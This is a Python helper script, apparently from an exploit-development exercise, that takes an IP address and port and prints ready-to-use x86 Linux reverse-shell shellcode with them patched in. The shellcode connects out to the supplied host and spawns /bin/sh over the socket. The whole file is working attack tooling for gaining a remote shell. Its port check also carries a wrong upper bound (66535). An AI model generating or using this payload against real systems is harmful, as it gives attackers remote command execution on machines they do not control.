#!/usr/bin/python3
import argparse



parser = argparse.ArgumentParser(description='Quickly set ip and  port for a x86 linux Reverse shellcode\n')
parser.add_argument('ip', metavar='ip' , type=str, nargs=1, help="ip address")
parser.add_argument('port', metavar='p', type=int, nargs=1,
                    help='port number')

args = parser.parse_args()


ip = args.ip[0]
port =args.port[0]

#error checking on port 
if (port > 66535 or port < 0):
    print("[LOG]: insert a valid port number!")
    exit(1)



#spaghetti code  because I'm lazy 

def ip2int(ip):
    ip = ip.split(".")
    ip_dec = (int(ip[0]) << 24) + (int(ip[1]) << 16) + (int(ip[2]) << 8) + int(ip[3])
    return ip_dec


#convert int to hex and format it 
port = '{0:0{1}X}'.format(port,4)
port = '\\x' + '\\x'.join(port[i:i+2] for  i in range(0, len(port), 2))

ip = '{0:0{1}X}'.format(ip2int(ip),4)
ip = '\\x' + '\\x'.join(ip[i:i+2] for  i in range(0, len(ip), 2))

shellcode = r'"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x52\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x43\x89\xc7\x68' +  ip  + r'\x66\x68' + port  + r'\x66\x53\x89\xe1\x6a\x10\x51\x57\xb0\x66\x66\x43\x89\xe1\xcd\x80\x89\xd9\x87\xdf\x49\xb0\x3f\xcd\x80\x75\xf9\x52\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80";'

print(shellcode)
